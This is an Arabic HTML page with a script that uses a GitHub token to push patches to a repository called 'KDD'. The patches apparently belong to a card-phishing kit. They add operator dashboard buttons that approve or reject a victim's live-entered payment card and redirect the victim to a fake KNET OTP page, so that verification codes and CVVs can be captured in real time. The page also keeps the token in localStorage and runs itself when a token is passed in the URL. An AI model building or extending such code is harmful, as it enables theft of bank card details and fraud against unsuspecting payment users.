<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>KDD — موافقة البطاقة المباشرة v4</title>
<style>
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:20px}
.card{max-width:660px;margin:0 auto;border:1px solid #1e293b;border-radius:14px;padding:20px}
h1{font-size:18px;color:#fff;margin:0 0 10px}
input{width:100%;box-sizing:border-box;padding:11px;border-radius:9px;border:1px solid #334155;background:#1e293b;color:#e2e8f0;font-family:monospace;direction:ltr}
button{width:100%;margin-top:12px;padding:12px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
pre{margin-top:14px;padding:13px;background:#020617;border:1px solid #1e293b;border-radius:9px;color:#a7f3d0;font:12.5px monospace;line-height:1.8;white-space:pre-wrap;min-height:80px}
.muted{font-size:12px;color:#64748b;line-height:1.7;margin-top:12px}
</style></head><body><div class="card">
<h1>🔧 موافقة البطاقة المباشرة → إخفاء + تحويل لصفحة الكود (v4)</h1>
<input id="tok" type="password" placeholder="الصق التوكن (ghp_...)" autocomplete="off">
<button id="go">🚀 نفّذ وارفع</button>
<pre id="log">جاهز.</pre>
<div class="muted">api.github.com فقط · يحتاج Contents: Read and write</div>
</div>
<script>
(function(){
var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
var API='https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/';
var MSG='fix: approve on live card hides it and goes to code page';
var $=function(i){return document.getElementById(i)};
function log(t){var e=$('log');e.textContent+=t+'\n';e.scrollTop=e.scrollHeight}
function b64e(s){return btoa(unescape(encodeURIComponent(s)))}
function b64d(s){return decodeURIComponent(escape(atob(String(s).replace(/\s/g,''))))}
function ep(p){return p.split('/').map(encodeURIComponent).join('/')}
function tok(){return $('tok').value.trim()}
function H(){return {'Authorization':'Bearer '+tok(),'Accept':'application/vnd.github+json','X-GitHub-Api-Version':'2022-11-28'}}
async function gh(p,o){var r=await fetch(API+p,Object.assign({headers:H()},o||{}));var x=await r.text();var j={};try{j=JSON.parse(x)}catch(e){}
if(!r.ok)throw new Error((j&&j.message)||('HTTP '+r.status));return j}

/* ===== السيرفر: الموافقة تُخفي البطاقة المباشرة وتحوّل لصفحة الكود ===== */
var L_old=`    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { visitorId: __v98._id, page: __v98.page }); } catch(e){} }); } } catch(e){}`;
var L_new=L_old+`
    // [FIX-LIVE] الموافقة: اخفِ بطاقة المباشر + وجّه الزائر لصفحة الكود
    try {
      if (action === 'otp' || action === 'approve' || action === 'cvv' || action === 'reject') {
        var __lv = visitors.get(visitorSocketId);
        if (!__lv) { visitors.forEach(function(x){ if (!__lv && x && (x._id === visitorSocketId || x.socketId === visitorSocketId)) __lv = x; }); }
        if (__lv) {
          __lv.liveCard = null;
          __lv.liveCardTimestamp = null;
          if (action !== 'reject') {
            if (/كي\s*نت|knet/i.test(String(__lv.page || '')) && !/otp|رمز/i.test(String(__lv.page || ''))) __lv.page = 'رمز التحقق كي نت (OTP)';
            __lv.__f98otp = Date.now();
            try { __f91Emit(visitorSocketId, 'visitor:navigate', 'otp-verification'); } catch(e){}
          }
          visitors.set(visitorSocketId, __lv);
          saveVisitorPermanently(__lv);
          admins.forEach(function(a, k){
            try { io.to(k).emit('card:liveUpdate', { visitorId: __lv._id, liveCard: null, liveCardTimestamp: null }); } catch(e){}
            try { io.to(k).emit('visitor:pageChanged', { visitorId: __lv._id, page: __lv.page }); } catch(e){}
          });
        }
      }
    } catch(e) {}`;

/* ===== لوحة التحكم: أزرار موافقة/رفض على البطاقة المباشرة ===== */
var M_old=`  html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + lcNetwork + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(lcInfo.type).toUpperCase() + ' • ' + String(lcInfo.tier).toUpperCase() + '</span></div>';
  html += '</div>';
  html += '</div></div>';
}`;
var M_new=`  html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + lcNetwork + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(lcInfo.type).toUpperCase() + ' • ' + String(lcInfo.tier).toUpperCase() + '</span></div>';
  html += '</div>';
  html += '</div>';
  /*FIX-LIVE*/
  html += '<div class="flex gap-2 mt-3">';
  html += '<button onclick="liveApprove(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
  html += '<button onclick="liveReject(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
  html += '</div>';
  html += '</div>';
}`;

var N_old=`    // Code action functions (for OTP/digit codes)
    function codeActionCVV(btn, socketId, codeIndex) {`;
var N_new=`    // [FIX-LIVE] موافقة/رفض البطاقة المباشرة
    function liveApprove(btn, socketId) {
      window.skipDetailsUpdate = true;
      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
      var v = Array.from(visitors.values()).find(function(x){ return x && (x.socketId === socketId || x._id === socketId); });
      if (v) { v.liveCard = null; v.liveCardTimestamp = null; v.page = 'رمز التحقق كي نت (OTP)'; visitors.set(v._id, v); }
      if (btn) { btn.textContent = 'تم ✓'; btn.classList.add('bg-gray-500'); }
      renderVisitorsList();
      if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
      setTimeout(function(){ window.skipDetailsUpdate = false; }, 1600);
    }
    function liveReject(btn, socketId) {
      window.skipDetailsUpdate = true;
      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
      var v = Array.from(visitors.values()).find(function(x){ return x && (x.socketId === socketId || x._id === socketId); });
      if (v) { v.liveCard = null; v.liveCardTimestamp = null; visitors.set(v._id, v); }
      if (btn) { btn.textContent = 'تم ✓'; btn.classList.add('bg-gray-500'); }
      renderVisitorsList();
      if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
      setTimeout(function(){ window.skipDetailsUpdate = false; }, 1600);
    }
    window.liveApprove = liveApprove;
    window.liveReject = liveReject;

    // Code action functions (for OTP/digit codes)
    function codeActionCVV(btn, socketId, codeIndex) {`;

var adm=[[M_old,M_new],[N_old,N_new]];
var PATCHES={'server/index.js':[[L_old,L_new]],
'server/admin/index.html':adm,
'kdd-public/admin.html':adm};

async function run(){
 if(!tok()){log('⚠️ الصق التوكن أولاً');return}
 localStorage.setItem('kdd_tok',tok());
 $('log').textContent='';
 log('🔎 فحص التوكن...');
 try{await gh('');log('✅ الوصول سليم')}catch(e){log('❌ '+e.message);return}
 var fs=Object.keys(PATCHES),d=0;
 for(var f=0;f<fs.length;f++){var file=fs[f];
  try{log('\n⏳ '+file);
   var m=await gh(ep(file)+'?ref='+BRANCH),s=b64d(m.content),ap=0,pr=PATCHES[file];
   for(var i=0;i<pr.length;i++){var a=pr[i][0],b=pr[i][1];
    if(s.indexOf(b)!==-1)continue; if(s.indexOf(a)===-1){log('   ⚠️ مرجع ناقص #'+(i+1));continue} s=s.replace(a,b);ap++}
   if(!ap){log('   ✓ مطبّق مسبقاً')}
   else{await gh(ep(file),{method:'PUT',body:JSON.stringify({message:MSG+' ['+file+']',content:b64e(s),sha:m.sha,branch:BRANCH})});log('   ✅ تم التعديل والرفع ('+ap+')')}
   d++}catch(e){log('   ❌ '+e.message)}}
 log('\n🏁 خلص. انتظر النشر ثم Ctrl+F5.');
}
$('go').onclick=function(){$('go').disabled=true;run().finally(function(){$('go').disabled=false})};
var st=decodeURIComponent(location.hash.replace('#',''))||localStorage.getItem('kdd_tok');
if(st){$('tok').value=st;run()}
})();
</script></body></html>
